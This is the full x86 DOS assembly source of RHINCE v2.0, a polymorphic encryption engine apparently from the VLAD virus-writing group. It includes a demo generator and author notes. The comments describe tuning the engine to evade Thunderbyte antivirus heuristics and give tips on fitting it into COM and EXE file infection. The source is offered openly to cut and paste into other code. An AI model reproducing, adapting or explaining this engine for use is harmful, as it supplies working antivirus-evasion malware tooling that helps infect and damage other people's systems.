; RHINCE 2.0, by Rhincewind [Vlad]
;
; This is the accompanying textfile for RHINCE v2.0, where RHINCE stands for
; "Rickety and Hardly Insidious yet New Chaos Engine". There's been quite
; a lot of feedback on the original release, both positive and negative. The
; negative reviews mainly dealt with the engine being so obscenely
; ineffective. To you I say, you missed the point: RHINCE was and is an 
; experiment in writing small polymorphic engines using tables.
;
; I rewrote RHINCE because I came up with a method that I hoped would make
; it much, much shorter, say, under 300 bytes. Not so I'm afraid, the pure
; v1.0 rewrite amounted to 367 bytes.
;
; This version doesn't use encoding routines that use tables. No, it uses
; one encoding routine and a set of tables. In almost every engine, the
; routines all have a certain structure in common and yet they're never quite
; the same so optimisation by using subroutines is difficult. This is an
; easier approach:
;
; Encoding takes place byte for byte, and a tablestring is used to describe
; it's specifics. First byte in the string is the commandbyte:
; 
;       bit 4   quote next byte.
;       bit 3   get random choice. next byte is the number of choices,
;               followed by the choices themselves.
;       bit 2   next byte is a mask indicating which bits to randomise.
;       bit 1   next byte is a mask for ANDing, the byte thereafter
;               is an illegal choice for the masked byte.
;       bit 0   next byte is a byte displacement used to jump to.
;               (for table optimisation)
;
; The commandbyte is followed by the arguments for the bit 4 command if it
; was set, then the arguments for bit 3 if it was set, et cetera. It's all
; in the code.
;
; So the original rewrite was finished but the engine's performance was still
; approximately zero. Tweaking done:
;
;        ** DAA DAS AAA AAS opcodes removed.   flagged by TBAV (@)
;        ** $+2 flowcontrol removed.           flagged by TBAV (G)
;           JO/JNO branching                   flagged by TBAV (@)
;        ** Forced first opcode to not be an   flagged by TBAV (G)
;           opcode needing previous register
;           contents
;        ** No longer builds decryptor inside  flagged by TBAV (#)
;           code, but rather on the heap.
;
; RHINCE v2.0 is almost TBAV heuristics proof. A negligible amount of
; samples still gets G flags on pointer references in the first 32 bytes.
; Then there is the occasional E, U, t or D flag probably caused
; by Thunderbyte interpreting the random byte and word values as code,
; i.e. signature scanning.
;
; Thunderbyte's heuristics are really interesting. The G flag for operations
; with uninitialised registers can only be triggered by the first 32 bytes
; of code (or so). The $+2 flowcontrol check is active throughout the
; program but the check for self-modifying code (which is how it detected
; v1.0) is only active in the first 512 bytes.
; 
; Call Parameters:       CX      length of code to encrypt
;                     DS:DX      pointer to code to encrypt
;                        BP      offset code will be run at.
; Return Parameters:     CX      length of decryptor+encrypted code.
;                     DS:DX      pointer to decryptor.
;
; Caution:Engine assumes CS=DS=ES. Also as said above, RHINCE v2.0 builds
;         a decryptor on the heap. Please ensure that the heapspace is there!
;         In COM infection mind the maximum filelength you can infect. In
;         EXE infection you should check, and alter if necessary, the 
;         MINALLOC header field. If alteration of MINALLOC was necessary, 
;         see if MAXALLOC>MINALLOC. If not set MAXALLOC==MINALLOC.
;
; RHINCE v2.0: 377 bytes undiluted polymorphic generation code.
;                                                - Rhince.

        .model tiny
        .code
        org 100h

;Below is a small demogenerator. Assemble & run this file as is to generate
;an encrypted HELLO.COM file, cut/paste the engine code otherwise.

start:
                mov ah,3ch
                xor cx,cx
                mov dx, offset file
                int 21h
                push ax
                mov dx, offset prog
                mov cx, (endprog-prog)
                mov bp, 100h
                call mut_eng
                pop bx
                mov ah, 40h
                int 21h
                mov ah, 3eh
                int 21h
                mov ah,9
                mov dx, offset msg
                int 21h
                int 20h
file            db 'hello.com',0
msg             db 'Run HELLO.COM to decrypt and print a sacred VLAD scripture$'
prog:           mov ah,9
                call $+3
delta:          pop dx
                add dx, (str-delta)
                int 21h
                int 20h
str             db 'At the word of the dark judges, that word which '
                db 'tortures the spirit,',0dh,0ah
                db 'Kantza-Merada, even the goddess, was turned to a '
                db 'dead body,',0dh,0ah
                db 'Defiled, polluted, a corpse hangin'' from a stake.'
                db 0dh,0ah,0dh,0ah
                db 'Most strangely, Kantza-Merada, are the laws of the '
                db 'dark world effected.',0dh,0ah
                db 'O Kantza-Merada, do not question the laws of the '
                db 'nether world.',0dh,0ah,0dh,0ah
                db 'The goddess from the great above descended to the '
                db 'great below.',0dh,0ah
                db 'To the nether world of darkness she descended.',0dh,0ah
                db 'The goddess abandoned heaven, abandoned earth,',0dh,0ah
                db 'Abandoned dominion, abandoned ladyship,',0dh,0ah
                db 'To the nether world of darkness she descended.$'
endprog:

;------ Engine starts here.

mut_eng:        mov di, offset resulting_code     
                inc cx
                shr cx,1
                mov word ptr [di-(resulting_code-cntr)],cx
                call get_rand
                mov ah,al
                call get_rand
                mov word ptr [di-(resulting_code-seed)],ax
                push bp
                push dx
                call get_rand
                and ax, 1
                call do_garbage_manual
                mov cx, 9
genloop:        push cx
                call get_rand
                and ax,0fh
                inc ax
                xchg ax,cx
gloop:          push cx
                call do_garbage
                pop cx
                loop gloop
                mov ax, 0c72eh
                stosw
                mov al, 06
                stosb
                pop cx
                mov bx,cx
                add bx,bx
                mov word ptr ds:[workspace-2+bx],di
                stosw
                stosw
                loop genloop
                pop si
                pop bp
                mov al, 0e9h
                stosb
                mov cx, word ptr cntr
                mov ax,cx
                add ax,cx
                stosw
                add ax, (endframe-framework)
                neg ax
                mov jmpback, ax
                lea bx, [di+bp+(-(offset resulting_code))]
                mov word ptr ptr, bx
cryptloop:
                lodsw
                xor ax, word ptr seed
                stosw
                loop cryptloop
                mov dx,di
                push di
                mov si, offset framework
                mov bx, offset resulting_code
                push bx
                sub bp,bx
                mov cx,9
fill_loop:      dec bx
                dec bx
                mov di, word ptr [bx]
                lea ax, [bp+si+(-(offset framework))]
                add ax,dx
                stosw
                movsw
                loop fill_loop
                pop dx
                pop cx
                sub cx,dx
                ret
get_rand:       in al,40h    
                rol al,1  ;RNG v2.0
                xor al, 0ffh
                org $-1
Randomize       db ?
                mov randomize,al
                ret
do_garbage:     call get_rand
                and ax, 0fh
do_garbage_manual:                
                mov bx,ax
                mov bl, byte ptr [calltable+bx]
                xor bh,bh
                lea bp, [bx+poly]
interpret_string:
                mov si,bp
                cwd
                lodsb
                mov dh,al
                test dh,16
                jz dont_quote
                lodsb
                mov dl,al
dont_quote:     test dh,8
                jz  dont_select
                lodsb
                cbw
                xchg ax,cx
                call get_rand
                xor ah,ah
                div cl
                xchg al,ah
                cbw
                xchg ax,bx
                mov dl, byte ptr ds:[si+bx]
                add si,cx
dont_select:    test dh,4
                jz no_random_masking
                call get_rand
                and al, byte ptr ds:[si]
                or dl,al
                inc si
no_random_masking:
                test dh,2
                jz no_illegal
                lodsb
                and al,dl
                inc si
                cmp al, byte ptr ds:[si-1]
                jz interpret_string
no_illegal:     mov bp,si
                mov al,dl
                stosb
                test dh,1
                jz no_jmp
                lodsb
                cbw
                add bp,ax
no_jmp:         cmp byte ptr ds:[bp],0
                jnz interpret_string
                ret
calltable:      db rnd_mov_8 - poly
                db rnd_mov_16 - poly
                db onebyte - poly
                db incs - poly
                db incs - poly
                db arithmetic_8 - poly
                db arithmetic_16 - poly
                db big_class_0_40 - poly
                db onebyte - poly
                db big_class_40_80 - poly
                db big_class_80_c0 - poly
                db big_class_c0_100 - poly
                db rnd_mov_8 - poly
                db rnd_mov_16 - poly
                db rnd_mov_8 - poly
                db rnd_mov_16 - poly
endcalltable:
poly:
big_class_0_40: db 00010100b,00000010b,00111001b,00000110b,00011111b
                db 00000111b,6,00
big_class_40_80:db 00010100b,00100010b,00011001b,00010111b,01000000b
                db 00011111b,00000111b,6,rndbyte-$
big_class_80_c0:db 00010100b,00100010b,00011001b,00010111b,10000000b
                db 00011111b,00000111b,6,rndword-$
big_class_c0_100:
                db 00010100b,00100010b,00011001b,00010110b,11000000b
                db 00011111b,00000111b,6,00
flow_control:   db 00010100b,72h,7,00010000b,0,0
arithmetic_8:   db 00010101b,00000100b,00111000b,rndbyte-$
arithmetic_16:  db 00010101b,00000101b,00111000b,rndword-$
rnd_mov_8:      db 00010101b,0b0h,7,rndbyte-$
rnd_mov_16:     db 00010110b,0b8h,07,07,04
rndword:        db 00000100b,0ffh
rndbyte:        db 00000100b,0ffh,0
incs:           db 00010110b,40h,0fh,7,4,0
onebyte:        db 00001000b,(end_onebyters-onebyters)
onebyters:      db 0fdh,0fch,0fbh,0f9h,0f8h,0f5h,0d7h,9fh,9eh,99h,98h
                db 91h,92h,93h,95h,96h,97h
end_onebyters:  db 0
framework:      cld
                mov si, 1234h
ptr             equ $-2                
                mov cx, 1234h
cntr            equ $-2
frameloop:      xor word ptr cs:[si], 1234h
seed            equ $-2
                lodsw
                loop frameloop
                db 0e9h
jmpback         dw ?
endframe:
workspace       db endframe-framework dup (?)
resulting_code:
end start
